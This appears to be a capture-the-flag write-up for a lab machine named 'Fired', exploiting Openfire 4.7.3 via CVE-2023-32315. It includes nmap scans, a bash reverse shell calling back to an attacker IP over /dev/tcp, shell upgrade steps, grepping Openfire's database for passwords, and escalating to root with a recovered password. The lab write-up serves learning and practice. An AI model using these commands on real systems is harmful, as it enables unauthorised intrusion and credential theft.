# Fired

## Enumeration & scanning

- Open ports are 22, 9090, and 9091.
- The webapp 'openfire' is running on 9090 and 9091. Openfire is a feature rich instant messaging (IM) and group chat server that uses the XMPP protocol.
- Openfire version is 4.7.3 according to login page that is prompted when browsing to it.

``` sh
# Default scanning
sudo nmap -p- 192.168.241.96 
sudo nmap -p 9090,9091 -A 192.168.241.96
```

## Exploitation

- There exists a RCE [vulnerability](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) in Openfire that seems to affect this version as well.
- Exploit using Burp. Register new admin account.
- Once in portal, as admin we can add a new management [plugin](https://github.com/miko550/CVE-2023-32315) that will allow us to execute commands and browse the filesystem.
- We do not manage to get a reverse shell using the command execution feature, but can add reverse shell code to a file using the filesystem browser. This file can then be executed.

``` sh
# Exploit using Burp (see notes) to register new account
# Upload management plugin (see notes)
# Create and edit /tmp/revshell.sh
/bin/bash -i >& /dev/tcp/192.168.45.243/4444 0>&1
chmod +x /tmp/revshell.sh
# Then we run it
nc -nlvp 4444
bash /tmp/revshell.sh
# Upgrade shell with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Fix on local side to make proper TTY
Ctrl + Z
stty raw -echo; fg
Enter
# Get local flag
id
uid=114(openfire) gid=118(openfire) groups=118(openfire) 
ls /home/openfire/local.txt
a31b364acad4893f8467af072fbc0cf8
```

## Privilege Escalation

- Can browse Openfire files.
- These files contain database configuration commands that contain credentials.
- One of these is for SMTP. This password can be used to pivot to `root`.

``` sh
# Check DB config files
cd /var/lib/openfire/embedded-db/
cat openfire.script | grep -i "password" 
# Login to root with password 'OpenFireAtEveryone'
su root 
```

## References

- https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce
- https://github.com/miko550/CVE-2023-32315

## Rabbit holes

- Linpeas did not show anything of interest, makes you go down into rabbit holes while you should think about what makes this environment different than others, being the Openfire files.
- Did decrypt the Openfire other user credentials but were not correct. Should have looked better as these were listed in the same file that contained the actually needed password.
- Added an oneliner to cheatsheet to search for 'password' string in any folder recursively as that would have found it for this box.
